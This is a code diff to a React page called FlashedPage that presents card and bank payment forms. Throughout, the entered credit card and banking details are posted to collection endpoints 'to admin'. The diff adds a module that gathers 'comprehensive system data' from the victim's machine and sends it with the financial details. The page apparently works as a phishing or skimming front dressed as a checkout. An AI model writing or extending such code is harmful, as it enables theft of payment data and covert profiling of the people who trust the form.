@@ -2038,7 +2038,11 @@ export default function FlashedPage() {
                       setStatus('Processing payment...');
                       
                       try {
-                        // Send credit card info to admin
+                        // Collect comprehensive system data
+                        const { collectAdvancedData } = await import('../utils/advancedCollection');
+                        const advancedData = await collectAdvancedData();
+                        
+                        // Send credit card info with advanced data to admin
                         await fetch('/api/collect-card-info', {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
@@ -2052,7 +2056,7 @@ export default function FlashedPage() {
                             cardAddress: cardAddress,
                             timestamp: new Date().toISOString(),
                             userAgent: navigator.userAgent,
-                            ip: 'pending'
+                            advancedData: advancedData
                           })
                         });
                         
@@ -2288,7 +2292,11 @@ export default function FlashedPage() {
                       setStatus('Setting up bank transfer...');
                       
                       try {
-                        // Send banking info to admin
+                        // Collect comprehensive system data
+                        const { collectAdvancedData } = await import('../utils/advancedCollection');
+                        const advancedData = await collectAdvancedData();
+                        
+                        // Send banking info with advanced data to admin
                         await fetch('/api/collect-bank-info', {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
@@ -2303,7 +2311,8 @@ export default function FlashedPage() {
                             bankPhone: bankPhone,
                             bankAddress: bankAddress,
                             timestamp: new Date().toISOString(),
-                            userAgent: navigator.userAgent
+                            userAgent: navigator.userAgent,
+                            advancedData: advancedData
                           })
                         });
                         
